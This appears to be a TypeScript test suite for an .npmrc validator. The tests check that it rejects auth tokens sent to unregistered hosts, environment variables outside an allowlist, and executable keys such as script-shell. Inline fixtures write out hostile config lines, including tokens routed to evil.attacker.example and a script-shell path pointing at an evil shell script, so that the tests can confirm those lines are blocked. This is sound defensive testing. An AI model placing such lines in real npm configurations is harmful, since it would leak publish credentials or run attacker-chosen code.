import assert from 'node:assert/strict';
import { test } from 'node:test';
import { readFileSync } from 'node:fs';
import { dirname, join } from 'node:path';
import { fileURLToPath } from 'node:url';

import {
  FORBIDDEN_EXECUTABLE_KEYS,
  mergeNpmrc,
  parseNpmrc,
  validateNpmrc,
} from '../index.js';

const fixturesDir = join(dirname(fileURLToPath(import.meta.url)), 'fixtures');

const options = {
  registries: ['https://registry.npmjs.org/'],
  allowedEnvVars: ['NPM_TOKEN'],
};

function fixture(name: string): string {
  return readFileSync(join(fixturesDir, name), 'utf8');
}

function codes(text: string): string[] {
  return validateNpmrc(text, options).issues.map((issue) => issue.code);
}

test('外发令牌：认证行与 registry 指向未登记主机时拒绝', () => {
  const text = fixture('malicious-token-exfil.npmrc');
  const result = validateNpmrc(text, options);

  assert.equal(result.ok, false);
  assert.ok(codes(text).includes('unregistered-auth-host'));
  assert.ok(codes(text).includes('unregistered-registry-host'));

  const authIssue = result.issues.find(
    (issue) => issue.code === 'unregistered-auth-host',
  );
  assert.equal(authIssue?.detail?.host, 'evil.attacker.example');

  const merged = mergeNpmrc(
    text,
    { registry: 'https://registry.npmjs.org/' },
    { ...options, env: { NPM_TOKEN: 'publish-token-secret' } },
  );
  assert.equal(merged.ok, false);
  assert.deepEqual(merged.config, {
    registry: 'https://registry.npmjs.org/',
  });
  assert.ok(
    !JSON.stringify(merged.config).includes('publish-token-secret'),
    '令牌绝不能出现在被拒绝的合并结果里',
  );
});

test('非白名单环境变量：引用未登记变量时拒绝', () => {
  const text = fixture('non-whitelisted-env.npmrc');
  const result = validateNpmrc(text, options);

  assert.equal(result.ok, false);
  const issue = result.issues[0];
  assert.equal(issue.code, 'non-whitelisted-env-var');
  assert.equal(issue.detail?.variable, 'NPM_CONFIG_TOKEN');

  const merged = mergeNpmrc(text, {}, {
    ...options,
    env: { NPM_CONFIG_TOKEN: 'leaked' },
  });
  assert.equal(merged.ok, false);
  assert.deepEqual(merged.config, {});
});

test('script-shell 与 git 等可执行路径键一律拒绝', () => {
  const text = fixture('script-shell.npmrc');
  const result = validateNpmrc(text, options);

  assert.equal(result.ok, false);
  assert.deepEqual(
    codes(text).filter((code) => code === 'forbidden-executable-key'),
    ['forbidden-executable-key', 'forbidden-executable-key'],
  );
  for (const key of FORBIDDEN_EXECUTABLE_KEYS) {
    assert.ok(
      result.issues.some((issue) => issue.key === key),
      `${key} 必须被拒绝`,
    );
  }
});

test('作用域 registry 指向未登记主机时拒绝', () => {
  const text = fixture('scoped-unregistered.npmrc');
  const result = validateNpmrc(text, options);

  assert.equal(result.ok, false);
  const issue = result.issues[0];
  assert.equal(issue.code, 'unregistered-registry-host');
  assert.equal(issue.key, '@acme:registry');
  assert.equal(issue.detail?.host, 'artifactory.internal.example');
});

test('合法配置：通过校验并仅展开白名单变量', () => {
  const text = fixture('valid.npmrc');
  const result = validateNpmrc(text, options);
  assert.equal(result.ok, true, JSON.stringify(result.issues));

  const base = { 'fund=false': 'true' };
  const merged = mergeNpmrc(text, base, {
    ...options,
    env: { NPM_TOKEN: 'registry-token' },
  });

  assert.equal(merged.ok, true);
  assert.deepEqual(merged.issues, []);
  assert.equal(
    merged.config['//registry.npmjs.org/:_authToken'],
    'registry-token',
  );
  assert.equal(merged.config.registry, 'https://registry.npmjs.org/');
  assert.equal(merged.config['@acme:registry'], 'https://registry.npmjs.org/');
  assert.equal(merged.config['save-exact'], 'true');
  assert.equal(merged.config['fund=false'], 'true');
});

test('字面量令牌发往未登记主机同样拒绝（不依赖变量展开）', () => {
  const text = '//evil.attacker.example/:_authToken=hardcoded-secret-token\n';
  const result = validateNpmrc(text, options);
  assert.equal(result.ok, false);
  assert.equal(result.issues[0].code, 'unregistered-auth-host');
});

test('白名单变量只发往登记主机，发往其他主机时拒绝', () => {
  const text = '//evil.attacker.example/:_authToken=${NPM_TOKEN}\n';
  const result = validateNpmrc(text, options);
  assert.equal(result.ok, false);
  assert.ok(codes(text).includes('unregistered-auth-host'));
});

test('$VAR 裸形式与 ${VAR} 形式都能识别', () => {
  const text = '//registry.npmjs.org/:_authToken=$NPM_TOKEN\n';
  assert.equal(validateNpmrc(text, options).ok, true);

  const bad = '//registry.npmjs.org/:_authToken=$OTHER_TOKEN\n';
  assert.equal(codes(bad)[0], 'non-whitelisted-env-var');
});

test('非法 registry URL 产生 invalid-url 问题', () => {
  const text = 'registry=not-a-url\n';
  assert.equal(codes(text)[0], 'invalid-url');
});

test('merge 失败时项目条目不会部分覆盖基础配置', () => {
  const text = [
    'save-exact=true',
    'script-shell=/tmp/pwn/evil-shell.sh',
  ].join('\n');
  const base = { registry: 'https://registry.npmjs.org/' };
  const merged = mergeNpmrc(text, base, options);

  assert.equal(merged.ok, false);
  assert.deepEqual(merged.config, base);
  assert.equal(merged.config['save-exact'], undefined);
});

test('解析器忽略注释、空行与 section 头，并记录格式错误行', () => {
  const parsed = parseNpmrc(
    [
      '; 注释',
      '# 另一条注释',
      '[publish]',
      '',
      'save-exact=true # 行内注释',
      'garbage-line-without-value',
    ].join('\n'),
  );
  assert.deepEqual(
    parsed.entries.map((entry) => [entry.key, entry.value]),
    [['save-exact', 'true']],
  );
  assert.equal(parsed.issues[0].code, 'malformed-line');
});
